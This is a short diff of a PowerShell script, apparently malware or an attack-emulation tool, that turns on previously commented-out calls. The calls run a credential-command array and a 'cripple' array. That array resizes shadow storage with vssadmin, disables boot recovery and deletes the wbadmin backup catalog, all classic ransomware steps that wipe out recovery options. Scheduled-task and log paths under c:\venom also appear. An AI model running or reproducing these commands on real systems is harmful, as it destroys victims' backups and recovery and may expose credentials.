@@ -84,9 +84,9 @@ $cripple_commands = @('cmd.exe /c vssadmin resize shadowstorage /for=C: /on=C: /
     'cmd.exe /c bcedit /set {default} recoveryenabled No'
 	'cmd.exe /c wbadmin delete catalog -quiet')
 
-#Invoke-CommandArray -Commands $cred_commands -Csv
-#Start-Sleep 5
-#Invoke-CommandArray -Commands $cripple_commands -Csv
+Invoke-CommandArray -Commands $cred_commands -Csv
+Start-Sleep 5
+Invoke-CommandArray -Commands $cripple_commands -Csv
 #$scheduledTaskCreator = $PSScriptRoot + '\sc.exe'
 $scheduledTaskCreator = "c:\venom\sc.exe"
 $pamperlog = "c:\venom\pamper_log.txt"
